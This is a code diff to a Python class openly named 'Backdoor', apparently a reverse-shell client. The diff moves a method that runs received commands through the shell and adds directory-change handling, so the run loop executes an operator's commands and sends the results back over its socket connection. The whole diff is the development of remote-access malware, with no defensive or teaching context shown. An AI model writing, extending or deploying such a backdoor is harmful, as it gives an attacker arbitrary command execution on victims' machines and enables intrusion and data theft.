@@ -33,14 +33,6 @@ class Backdoor:
 					time.sleep(3)
 
 
-	def execute_system_command(self, command):
-		try:
-			res = UkDecode(subprocess.check_output(command, shell = True))
-			return res
-		except:
-			return "[-] Check your command"
-
-
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		self.connection.send(json_data.encode())
@@ -55,6 +47,22 @@ class Backdoor:
 			except: continue
 
 
+	def execute_system_command(self, command):
+		try:
+			res = UkDecode(subprocess.check_output(command, shell = True))
+			return res
+		except:
+			return "[-] Check your command"
+
+
+	def change_working_directory_to(self, path):
+		try:
+			os.chdir(path)
+			return "[+] Changing working directory to " + path
+		except:
+			return f"[-] No such file or directory: '{path}'"
+
+
 	def run(self):
 		while True:
 			if self.connected:
@@ -62,6 +70,11 @@ class Backdoor:
 				if command == "exit":
 					self.reliable_send("")
 					self.connected = False
+
+				elif command.split()[0] == "cd":
+					path = command.replace("cd", "").strip()
+					res = self.change_working_directory_to(path)
+					self.reliable_send(res)
 
 				else:
 					res = self.execute_system_command(command)
